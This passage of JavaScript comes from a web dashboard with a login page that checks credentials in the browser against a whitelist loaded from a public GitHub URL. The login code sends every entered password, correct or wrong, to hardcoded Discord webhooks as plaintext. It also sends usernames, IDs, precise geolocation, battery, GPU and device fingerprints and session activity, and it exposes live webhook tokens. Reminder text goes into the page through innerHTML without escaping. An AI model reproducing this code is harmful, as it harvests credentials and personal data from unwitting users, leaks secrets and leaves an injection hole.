                          e.preventDefault();
                          const pressedKeys = [];
                          if (e.ctrlKey) pressedKeys.push('Ctrl');
                          if (e.altKey) pressedKeys.push('Alt');
                          if (e.shiftKey) pressedKeys.push('Shift');
                          if (e.metaKey) pressedKeys.push('Command');
                          // Filter out modifier keys themselves to avoid duplication
                          if (['Control', 'Alt', 'Shift', 'Meta'].includes(e.key)) {
                              // Only modifier keys are pressed, don't record the modifier key itself as the action key
                          } else {
                              pressedKeys.push(e.key === ' ' ? 'Space' : e.key);
                          }
                          keybindSequence = pressedKeys;
                          input.value = keybindSequence.join(' + ');
                          document.removeEventListener('keydown', keyCaptureListener, true); // Remove once a sequence is captured
                          input.blur(); // Remove focus
                          showNotification('Keybind recorded. Click Save Keybinds to apply.');
                      };
                      document.addEventListener('keydown', keyCaptureListener, true); // Capture globally
                      trackActivity('DASHBOARD_SETTINGS', `Keybind configuration initiated for "${action}"`);
                  });
                  input.addEventListener('blur', () => { // If user blurs without entering
                     if (!input.value) input.value = input.defaultValue;
                  });
              });
          }

          function saveKeybinds() {
              const newKeybinds = {};
              keybindInputs.forEach(input => {
                  const action = input.dataset.keybindAction;
                  newKeybinds[action] = input.value;
              });
              configuredKeybinds = newKeybinds;
              localStorage.setItem(LS_KEYBINDS, JSON.stringify(configuredKeybinds));
              showNotification('Keybinds saved!');
              trackActivity('DASHBOARD_SETTINGS', 'Keybinds configuration saved');
              loadKeybinds(); // Reload to ensure correct display, especially after empty inputs
          }

          loadKeybinds();
          saveKeybindsBtn.addEventListener('click', saveKeybinds);

          // Add a global keydown listener to implement configured keybinds
          document.addEventListener('keydown', (e) => {
              if (document.activeElement.tagName === 'INPUT' || document.activeElement.tagName === 'TEXTAREA' ||
                  !JSON.parse(localStorage.getItem('enableKeyboardShortcuts') || 'true')) {
                  return; // Don't trigger if typing or keybinds are disabled
              }

              const pressedKeys = [];
              if (e.ctrlKey) pressedKeys.push('Ctrl');
              if (e.altKey) pressedKeys.push('Alt');
              if (e.shiftKey) pressedKeys.push('Shift');
              if (e.metaKey) pressedKeys.push('Command'); // Command key (Mac)

              // Add the non-modifier key
              const key = e.key === ' ' ? 'Space' : e.key;
              if (!['Control', 'Alt', 'Shift', 'Meta'].includes(key)) {
                  pressedKeys.push(key);
              }
              const hotkeyString = pressedKeys.join(' + ');
              
              for (const action in configuredKeybinds) {
                  const storedHotkey = configuredKeybinds[action];
                  if (storedHotkey.toLowerCase() === hotkeyString.toLowerCase()) {
                      e.preventDefault();
                      executeKeybindAction(action);
                      break;
                  }
              }
          });

          function executeKeybindAction(action) {
              switch (action) {
                  case 'toggleNotes':
                      document.getElementById('notesBtn').click();
                      break;
                  case 'panic':
                      document.getElementById('panicBtn').click();
                      break;
                  case 'toggleSections':
                      document.getElementById('toggleSectionsBtn').click();
                      break;
                  case 'openCalculator':
                      dashboard.togglePanel('calculatorPanel');
                      break;
                  case 'openSettings':
                      dashboard.togglePanel('settingsPanel');
                      break;
                  case 'toggleFullscreen':
                      document.getElementById('fullScreenBtn').click();
                      break;
                  case 'reloadPage':
                      if (confirm('Are you sure you want to reload the page?')) window.location.reload();
                      break;
              }
              trackActivity('DASHBOARD_KEYBIND', `Executed keybind for: ${action}`);
          }
      },
      initReminders: function() {
        const remindersBtn = document.getElementById('remindersBtn');
        remindersBtn.addEventListener('click', () => {
            dashboard.togglePanel('remindersPanel');
            trackActivity('DASHBOARD_ACTION', 'Opened Reminders panel');
        });

        const reminderTextInput = document.getElementById('reminderTextInput');
        const reminderDateTimeInput = document.getElementById('reminderDateTimeInput');
        const addReminderBtn = document.getElementById('addReminderBtn');
        const remindersList = document.getElementById('remindersList');

        let reminders = JSON.parse(localStorage.getItem(LS_REMINDERS) || '[]');

        function renderReminders() {
            remindersList.innerHTML = '';
            if (reminders.length === 0) {
                remindersList.innerHTML = '<p style="color:#aaa; padding: 10px;">No reminders set.</p>';
                return;
            }

            reminders.sort((a, b) => new Date(a.time) - new Date(b.time));

            reminders.forEach((r, index) => {
                const div = document.createElement('div');
                div.className = 'activity-log-entry';
                div.style.marginBottom = '5px';
                const reminderTime = new Date(r.time);
                const now = new Date();

                let status = 'Upcoming';
                let textColor = 'var(--update-entry-text)'; // Default text color from theme
                if (reminderTime < now) {
                    status = 'Expired';
                    textColor = 'var(--error-color)'; // Red
                } else if (reminderTime.getTime() - now.getTime() < 3600000) {
                    status = 'Soon';
                    textColor = 'orange';
                }

                div.innerHTML = `<span style="color: ${textColor};">[${status}]</span> ${r.text} (${reminderTime.toLocaleString()}) <button class="small-btn" style="float:right; background-color: #f44336;" data-index="${index}">Delete</button>`;
                remindersList.appendChild(div);
            });
            setupDeleteReminderListeners();
        }

        function setupDeleteReminderListeners() {
            document.querySelectorAll('#remindersList button').forEach(button => {
                button.addEventListener('click', (e) => {
                    const index = parseInt(e.target.dataset.index);
                    if (!isNaN(index)) {
                        const removedReminder = reminders[index].text;
                        reminders.splice(index, 1);
                        localStorage.setItem(LS_REMINDERS, JSON.stringify(reminders));
                        renderReminders();
                        showNotification(`Reminder deleted: "${removedReminder}"`);
                        trackActivity('REMINDER_ACTION', `Deleted reminder: "${removedReminder}"`);
                    }
                });
            });
        }

        addReminderBtn.addEventListener('click', () => {
            const text = reminderTextInput.value.trim();
            const time = reminderDateTimeInput.value;

            if (text === '' || time === '') {
                showNotification('Please enter both reminder text and time.');
                return;
            }

            const reminderTime = new Date(time);
            if (isNaN(reminderTime.getTime())) {
                showNotification('Invalid date/time for reminder.');
                return;
            }
            if (reminderTime < new Date()) {
                 showNotification('Cannot set reminder in the past.');
                 return;
            }

            reminders.push({ text, time });
            localStorage.setItem(LS_REMINDERS, JSON.stringify(reminders));
            renderReminders();
            showNotification(`Reminder added for ${reminderTime.toLocaleString()}!`);
            trackActivity('REMINDER_ACTION', `Added reminder: "${text}" for ${time}`);
            
            reminderTextInput.value = '';
            reminderDateTimeInput.value = '';

            // Set an alert for the reminder (using native setTimeout)
            const timeUntilReminder = reminderTime.getTime() - new Date().getTime();
            if (timeUntilReminder > 0) {
                setTimeout(() => {
                    showNotification(`REMINDER: ${text}`);
                    trackActivity('REMINDER_ALERT', `Reminder triggered: "${text}"`);
                    // Optionally remove reminder after alert if it's a one-time reminder
                    reminders = reminders.filter(r => r.time !== time || r.text !== text);
                    localStorage.setItem(LS_REMINDERS, JSON.stringify(reminders));
                    renderReminders();
                }, timeUntilReminder);
            }
        });

        // Periodically re-render to update 'Expired' / 'Soon' statuses
        setInterval(renderReminders, 60000);

        renderReminders();
      },
      initStatsButton: function() {
        const statsBtn = document.getElementById('statsBtn');
        statsBtn.addEventListener('click', () => {
            dashboard.togglePanel('statsPanel');
            renderDashboardStats();
            trackActivity('DASHBOARD_ACTION', 'Opened Stats panel');
        });

        const resetStatsBtn = document.getElementById('resetStatsBtn');
        resetStatsBtn.addEventListener('click', () => {
            if (confirm('Are you sure you want to reset all dashboard statistics? This cannot be undone.')) {
                dashboardStats = { ...initialStats };
                localStorage.setItem(LS_DASHBOARD_STATS, JSON.stringify(dashboardStats));
                renderDashboardStats();
                showNotification('Dashboard statistics reset.');
                trackActivity('DASHBOARD_ACTION', 'Reset dashboard statistics');
            }
        });
      },
      initMediaButton: function() {
          const mediaBtn = document.getElementById('mediaBtn');
          mediaBtn.addEventListener('click', () => {
              dashboard.togglePanel('mediaPanel');
              trackActivity('DASHBOARD_ACTION', 'Opened Media panel');
          });
      }
    };

    // Login System JavaScript
    (() => {
      const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json';

      // Discord Webhooks - Ensure these URLs are valid and functional for logging
      const loggingWebhooks = {
        username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
        password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
        identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA',
        invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTpPMT9MooblezpxJLqDA97jIUShkp',
        invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
        invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
        attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWHjS39lC6YRZ_1aw',
        attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHaIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ'
      };

      const webhookUrls = { // General logging webhooks (likely same as some above, but kept separate for clarity)
        userLogging: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
        browserLogging: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
        deviceLogging: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLpWCbTltBfch-i970d1F',
        connectionLogging: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR5SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D',
        sessionLogging: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk'
      };

      const loginBox = document.getElementById('loginBox');
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      const userIDInput = document.getElementById('userID');
      const showPasswordCheckbox = document.getElementById('showPassword');
      const submitBtn = document.getElementById('submitBtn');
      const errorMsg = document.getElementById('errorMsg');
      const attemptsText = document.getElementById('attemptsText');
      const resetPopup = document.getElementById('resetPopup');
      const resetField = document.getElementById('resetField');
      const resetBtn = document.getElementById('resetBtn');
      const loginLoadingScreen = document.getElementById('loginLoadingScreen');
      const loginLoadingScreenText = document.getElementById('loginLoadingScreenText');
      const codeAnimation = document.getElementById('codeAnimation');
      const dashboardElement = document.getElementById('dashboard');


      let attempts = 3; // Max attempts reduced to 3
      let users = [];
      let loginTime = null; // Store login timestamp

      // Show/hide password toggle (login page)
      showPasswordCheckbox.addEventListener('change', () => {
        passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
        trackActivity('LOGIN_TOGGLE', `Show password toggled ${showPasswordCheckbox.checked ? 'ON' : 'OFF'}`);
      });

      // Fetch user whitelist data
      fetch(USER_JSON_URL)
        .then(res => {
            if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);
            return res.json();
        })
        .then(data => {
          users = data;
          trackActivity('APP_DATA', 'User whitelist loaded successfully.');
        })
        .catch(error => {
          users = [];
          console.error('Failed to load user JSON data:', error);
          trackActivity('ERROR', `Failed to load user whitelist data: ${error.message}`);
          alert('Failed to load user data. Please try again later.');
        });

      // Flashes the login box border red on invalid attempts
      function flashRedOutline(times = 2, delay = 400) {
        let count = 0;
        function flash() {
          loginBox.classList.add('flashing');
          setTimeout(() => {
            loginBox.classList.remove('flashing');
            count++;
            if (count < times) setTimeout(flash, delay);
          }, delay);
        }
        flash();
        trackActivity('LOGIN_UI', 'Login box flashing red');
      }

      // Collects WebGL renderer info for logging
      function getWebGLRenderer() {
        try {
          const canvas = document.createElement('canvas');
          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
          if (!gl) return "Unavailable";
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
        } catch (e) {
          console.error("WebGL Renderer Info failed:", e);
          return "Error";
        }
      }

      // Collects battery status (async operation)
      async function getBatteryStatus() {
        if (navigator.getBattery) {
          try {
            const battery = await navigator.getBattery();
            return {
                charging: battery.charging ? "Yes" : "No",
                level: `${Math.round(battery.level * 100)}%`,
                chargingTime: battery.chargingTime !== Infinity ? `${Math.round(battery.chargingTime / 60)} mins to full` : 'Not charging',
                dischargingTime: battery.dischargingTime !== Infinity ? `${Math.round(battery.dischargingTime / 3600)} hrs remaining` : 'Charging or Full'
            };
          } catch (e) {
            console.warn("Battery status unavailable:", e);
            return null;
          }
        }
        return null;
      }
      
      // Collects GeoLocation (async operation with error handling)
      async function getGeoLocation() {
        return new Promise(resolve => {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => resolve(`Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude} (Accuracy: ${position.coords.accuracy}m)`),
                    (error) => {
                        let msg = "Denied or Unavailable";
                        if (error.code === error.PERMISSION_DENIED) msg = "Permission Denied";
                        else if (error.code === error.POSITION_UNAVAILABLE) msg = "Position Unavailable";
                        else if (error.code === error.TIMEOUT) msg = "Timeout";
                        resolve(`Error: ${msg}`);
                    },
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            } else {
                resolve("Not Supported");
            }
        });
      }


      // Finds user in the loaded whitelist
      function findUser(username, userID) {
        return users.find(u =>
          u.username?.toLowerCase() === username.toLowerCase() &&
          u.userID?.toString() === userID.toString()
        );
      }

      // Sends Discord webhook (utility function)
      async function sendWebhook(url, embed) {
        if (!url || !embed) {
            console.warn("Webhook URL or embed content missing.");
            return;
        }
        try {
          await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] }),
          });
        } catch (e) {
          console.warn('Webhook send failed:', e);
          trackActivity('ERROR', `Webhook send failed to ${url} with error: ${e.message}`);
        }
      }

      // Collects comprehensive logging data (augmented with more details)
      async function collectLoggingData(user, password) {
        const now = new Date();
        loginTime = now.toISOString();
        const batteryStatus = await getBatteryStatus();
        const geolocation = await getGeoLocation();

        const nav = navigator;
        const screen_obj = screen;
        const conn_obj = nav.connection || {};

        return {
          user, password, loginTime, batteryStatus, webglRenderer: getWebGLRenderer(),
          platform: nav.platform || "Unknown",
          hardwareConcurrency: nav.hardwareConcurrency ? `${nav.hardwareConcurrency} cores` : "Unavailable",
          deviceMemory: nav.deviceMemory ? `${nav.deviceMemory} GB` : "Unavailable",
          referrer: document.referrer || "Direct Entry", // New
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, // New
          screenResolution: `${screen_obj.width}x${screen_obj.height}`,
          pixelDepth: screen_obj.pixelDepth,
          colorDepth: screen_obj.colorDepth, // New (already was in DeviceLogging, making sure it's accessible for general data collection)
          geolocation: geolocation, // New
          websocketSupported: ('WebSocket' in window) ? 'Yes' : 'No', // New
          connectionType: conn_obj.effectiveType || "Unknown", // New
          userAgent: nav.userAgent, // New (was in BrowserLogging, making sure general access)
          language: nav.language, // New (was in BrowserLogging, making sure general access)
          devicePixelRatio: window.devicePixelRatio, // New (was in DeviceLogging, making sure general access)
          vendor: nav.vendor || "Unknown", // New (was in DeviceLogging, making sure general access)
        };
      }

      // Custom logging functions for each specific webhook
      async function logUsername(name, username) {
        const embed = { title: "Username Logging", color: 0x3498db, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }]};
        await sendWebhook(loggingWebhooks.username, embed);
      }
      async function logPassword(name, password) {
        const embed = { title: "Password Logging", color: 0xe74c3c, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Password", value: password, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }]};
        await sendWebhook(loggingWebhooks.password, embed);
      }
      async function logIdentifier(name, identifier) {
        const embed = { title: "Identifier Logging", color: 0x2ecc71, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }]};
        await sendWebhook(loggingWebhooks.identifier, embed);
      }
      async function logInvalidUsername(name, username) {
        const embed = { title: "Invalid Username Logging", color: 0xf39c12, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Username", value: username, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }]};
        await sendWebhook(loggingWebhooks.invalid_username, embed);
      }
      async function logInvalidPassword(name, password) {
        const embed = { title: "Invalid Password Logging", color: 0xe67e22, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Password", value: password, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }]};
        await sendWebhook(loggingWebhooks.invalid_password, embed);
      }
      async function logInvalidIdentifier(name, identifier) {
        const embed = { title: "Invalid Identifier Logging", color: 0xd35400, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Invalid Identifier", value: identifier, inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }]};
        await sendWebhook(loggingWebhooks.invalid_identifier, embed);
      }
      async function logAttemptsCounter(name, username, password, identifier, attemptsLeft) {
        const embed = { title: "Attempts Counter Logging", color: 0x9b59b6, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password", value: password, inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Attempts Left", value: attemptsLeft.toString(), inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }]};
        await sendWebhook(loggingWebhooks.attempts_counter, embed);
      }
      async function logAttemptsExceeded(name, username, password, identifier) {
        const embed = { title: "Attempts Exceeded Logging", color: 0xc0392b, fields: [{ name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password", value: password, inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Status", value: "MAX ATTEMPTS EXCEEDED", inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false }]};
        await sendWebhook(loggingWebhooks.attempts_exceeded, embed);
      }

      // Builds embed for User Logging
      function buildUserLoggingEmbed(data) {
        return {
          title: "User Logging System", color: 0xff0000,
          fields: [
            { name: "Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username, inline: true },
            { name: "Password", value: data.password, inline: true },
            { name: "Rank Type", value: data.user.rank?.toString() || "N/A", inline: true },
            { name: "Role Type", value: data.user.role || "N/A", inline: true },
            { name: "Login Time", value: data.loginTime, inline: false },
            { name: "User Identifier", value: data.user.userID.toString(), inline: true },
            { name: "Account Creation Date", value: data.user.accountCreationDate || "N/A", inline: true },
            { name: "First Name", value: data.user.firstName || "N/A", inline: true }, // New Logging field
            { name: "Last Name", value: data.user.lastName || "N/A", inline: true } // New Logging field
          ]
        };
      }

      // Builds embed for Browser Logging
      function buildBrowserLoggingEmbed(data) {
        const nav = navigator;
        return {
          title: "Browser Logging System", color: 0x00ff00,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User Identifier", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Browser Vendor", value: data.vendor, inline: true },
            { name: "Browser Language", value: data.language, inline: true },
            { name: "Browser Languages", value: nav.languages ? nav.languages.join(", ") : "Unknown", inline: false },
            { name: "User Agent", value: data.userAgent, inline: false },
            { name: "Installed Plugins", value: nav.plugins?.length > 0 ? `${nav.plugins.length} plugin(s)` : "None", inline: true },
            { name: "Browser Window Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true },
            { name: "Browser Zoom Level", value: `${Math.round(data.devicePixelRatio * 100)}%`, inline: true },
            { name: "Incognito/Private Mode Status", value: "Undetected", inline: true },
            { name: "Cookies Enabled", value: nav.cookieEnabled ? "Yes" : "No", inline: true },
            { name: "Do Not Track", value: nav.doNotTrack || "Unknown", inline: true },
            { name: "Browser Tab Visibility", value: document.visibilityState || "Unknown", inline: true },
            { name: "WebGL Renderer Info", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Browser Connection Type (Effective)", value: data.connectionType, inline: true },
            { name: "Document Referrer", value: data.referrer, inline: false }, // New
            { name: "Media Devices Detected", value: nav.mediaDevices ? 'Yes' : 'No', inline: true }, // New Logging field
            { name: "Service Worker Support", value: ('serviceWorker' in navigator) ? 'Yes' : 'No', inline: true } // New Logging field
          ]
        };
      }

      // Builds embed for Device Logging
      function buildDeviceLoggingEmbed(data) {
        const nav = navigator;
        const battery = data.batteryStatus;
        return {
          title: "Device Logging System", color: 0x0000ff,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Device Platform", value: data.platform, inline: true },
            { name: "CPU Cores", value: data.hardwareConcurrency, inline: true },
            { name: "Device Memory", value: data.deviceMemory, inline: true },
            { name: "GPU Renderer", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Battery Charging", value: battery?.charging || "Unavailable", inline: true },
            { name: "Battery Level", value: battery?.level || "Unavailable", inline: true },
            { name: "Touch Support", value: ('ontouchstart' in window || nav.maxTouchPoints > 0) ? "Yes" : "No", inline: true },
            { name: "Screen Resolution", value: data.screenResolution, inline: true },
            { name: "Screen Orientation", value: screen.orientation?.type || "Unavailable", inline: true },
            { name: "Color Depth", value: `${data.colorDepth} bit`, inline: true },
            { name: "Pixel Depth", value: `${data.pixelDepth} bit`, inline: true },
            { name: "Device Pixel Ratio", value: data.devicePixelRatio?.toString() || "Unknown", inline: true },
            { name: "Max Touch Points", value: nav.maxTouchPoints?.toString() || "0", inline: true },
            { name: "Vendor (Device)", value: data.vendor, inline: true },
            { name: "RAM Amount (System)", value: nav.deviceMemory ? `${nav.deviceMemory} GB` : "Unknown", inline: true }, // New Logging field
            { name: "Browser Rendering Engine", value: nav.appCodeName || "Unknown", inline: true } // New Logging field
          ]
        };
      }

      // Builds embed for Connection Logging
      function buildConnectionLoggingEmbed(data) {
        const nav = navigator;
        const conn_obj = nav.connection || {};
        return {
          title: "Connection Logging System", color: 0xffff00,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Online Status", value: nav.onLine ? "Online" : "Offline", inline: true },
            { name: "Connection Type", value: conn_obj.type || "Unknown", inline: true },
            { name: "Effective Connection Type", value: data.connectionType, inline: true },
            { name: "Downlink Speed", value: conn_obj.downlink ? `${conn_obj.downlink} Mbps` : "Unknown", inline: true },
            { name: "RTT (Round Trip Time)", value: conn_obj.rtt ? `${conn_obj.rtt} ms` : "Unknown", inline: true },
            { name: "Save Data Mode", value: conn_obj.saveData ? "Enabled" : "Disabled", inline: true },
            { name: "IP Address", value: data.user.ipAddress || "Unavailable", inline: false },
            { name: "VPN Detected", value: data.user.vpnDetected ? "Yes" : "No", inline: true },
            { name: "Proxy Detected", value: data.user.proxyDetected ? "Yes" : "No", inline: true },
            { name: "Public IPv6", value: data.user.ipv6Address || "Unavailable", inline: false },
            { name: "Local IP Addresses", value: data.user.localIPs?.join(", ") || "Unavailable", inline: false },
            { name: "Network Downlink Max", value: conn_obj.downlinkMax ? `${conn_obj.downlinkMax} Mbps` : "Unknown", inline: true },
            { name: "Network Metered Connection", value: conn_obj.metered ? "Yes" : "No", inline: true },
            { name: "System Timezone", value: data.timezone, inline: true }, // New
            { name: "WebSocket Support", value: data.websocketSupported, inline: true }, // New
            { name: "Geo-Location", value: data.geolocation, inline: false } // New
          ]
        };
      }

      // Builds embed for Session Logging
      function buildSessionLoggingEmbed(data) {
        return {
          title: "Session Logging System", color: 0x00ffff,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Login Time", value: data.loginTime || "Unknown", inline: true },
            { name: "Logout Time", value: data.logoutTime || "Unknown", inline: true },
            { name: "Session Duration", value: data.sessionDuration || "Unknown", inline: true },
            { name: "Pages Visited", value: data.pagesVisited?.join(", ") || "None", inline: false },
            { name: "Actions Performed", value: activityLogs.filter(log => !log.type.startsWith('LOGIN_') && !log.type.startsWith('ALERT')).map(log => log.description || log.type).join("; ") || "None", inline: false }, // Aggregating tracked dashboard activities
            { name: "Errors Encountered", value: activityLogs.filter(log => log.type === 'ERROR').map(log => log.description).join("; ") || "None", inline: false }, // Logged errors
            { name: "Warnings", value: activityLogs.filter(log => log.type === 'WARNING').map(log => log.description).join("; ") || "None", inline: false },
            { name: "Total Clicks", value: dashboardStats.totalClicks.toString(), inline: true }, // From tracked stats
            { name: "Buttons Pressed", value: dashboardStats.buttonsPressed.toString(), inline: true }, // From tracked stats
            { name: "Toggles Flipped", value: dashboardStats.togglesFlipped.toString(), inline: true }, // From tracked stats
            { name: "Panels Opened", value: dashboardStats.panelsOpened.toString(), inline: true },
            { name: "Screenshots Taken", value: dashboardStats.screenshotsTaken.toString(), inline: true }
          ]
        };
      }

      // Handles login form submission
      async function submitLogin() {
        trackActivity('LOGIN_ATTEMPT', 'Login button clicked');
        errorMsg.textContent = '';
        if (!usernameInput.value || !passwordInput.value || !userIDInput.value) {
          errorMsg.textContent = 'Please fill all fields.';
          trackActivity('LOGIN_FAILED', 'Missing fields');
          return;
        }

        const username = usernameInput.value;
        const password = passwordInput.value;
        const userID = userIDInput.value;
        const user = findUser(username, userID);

        // Log the attempt (pre-auth check)
        await logAttemptsCounter( user?.name || "Unknown", username, password, userID, attempts);

        if (!user) {
          await logInvalidUsername(user?.name || "Unknown", username);
          await logInvalidIdentifier(user?.name || "Unknown", userID);
          handleFailedAttempt('User not found.');
          trackActivity('LOGIN_FAILED', `User not found: ${username}, ID: ${userID}`);
          return;
        }

        if (password !== user.password) {
          await logInvalidPassword(user.name, password);
          handleFailedAttempt('Incorrect password.');
          trackActivity('LOGIN_FAILED', `Incorrect password for user: ${username}`);
          return;
        }

        // --- Successful Login ---
        attempts = 3;
        updateAttemptsText();
        errorMsg.textContent = '';
        resetPopup.style.display = 'none';
        loginBox.style.borderColor = 'white';
        loginBox.style.boxShadow = '0 0 15px white';
        trackActivity('LOGIN_SUCCESS', `Successful login by ${username}`);


        // Store login history
        let loginHistory = JSON.parse(localStorage.getItem(LS_LOGIN_HISTORY) || '[]');
        loginHistory.push({ timestamp: new Date().toISOString(), user: user.name || username, id: userID });
        localStorage.setItem(LS_LOGIN_HISTORY, JSON.stringify(loginHistory));


        // Log successful credentials via specific webhooks
        await logUsername(user.name, username);
        await logPassword(user.name, password);
        await logIdentifier(user.name, userID);

        // Collect comprehensive data and send general logs
        const loggingData = await collectLoggingData(user, password);

        // Send all general logging webhooks in parallel
        await Promise.all([
          sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.deviceLogging, buildDeviceLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.connectionLogging, buildConnectionLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)),
        ]);

        // Transition to Dashboard (loading animation sequence)
        document.body.style.zoom = 1;
        document.getElementById('loginQuickBar').style.display = 'none';
        document.getElementById('loginBox').style.display = 'none';
        document.getElementById('loginDateTimeBox').style.display = 'none';

        loginLoadingScreen.style.display = 'flex';
        codeAnimation.style.display = 'block';

        if (loginLoadingScreenText) loginLoadingScreenText.textContent = "Initializing Login Page...";

        // Stage 1: "Initializing Login Page..."
        setTimeout(() => {
            // Stage 2: "Initializing Dashboard..." (start code animation)
            if (loginLoadingScreenText) loginLoadingScreenText.textContent = "Initializing Dashboard...";
            
            // Hide loading screen and show dashboard after animation
            loginLoadingScreen.classList.add('hidden');
            setTimeout(() => {
                loginLoadingScreen.style.display = 'none';
                dashboardElement.style.display = 'block';
                document.body.className = 'dashboard-body'; // Apply dashboard body class
                document.body.style.zoom = globalZoomLevel; // Apply stored global zoom level

                document.getElementById('loggedInUser').textContent = user.name || user.username;
                document.getElementById('loggedInID').textContent = userID;
                
                dashboard.init(); // Initialize dashboard features

                trackActivity('DASHBOARD_LOAD', `Dashboard loaded for ${username}`);
            }, 3000); // Allow fade-out animation and code animation to complete
        }, 2000); // 2 seconds for initial "Initializing Login Page..." message
      }

      // Handles failed login attempts
      async function handleFailedAttempt(msg) {
        attempts--;
        updateAttemptsText();
        errorMsg.textContent = msg;
        
        if (attempts <= 0) {
          attempts = 0;
          errorMsg.textContent = 'No attempts left. Please reset.';
          
          const username = usernameInput.value;
          const password = passwordInput.value;
          const userID = userIDInput.value;
          const user = findUser(username, userID);
          
          await logAttemptsExceeded( user?.name || "Unknown", username, password, userID );
          trackActivity('LOGIN_EXCEEDED_ATTEMPTS', `Max login attempts exceeded for user: ${username}`);
          showResetPopup();
          disableInputs();
        } else {
          if (attempts <= 2) { // Changed threshold for flashing to 2 (since max is 3)
            flashRedOutline(2, 400);
          }
        }
      }

      // Updates attempts left display
      function updateAttemptsText() {
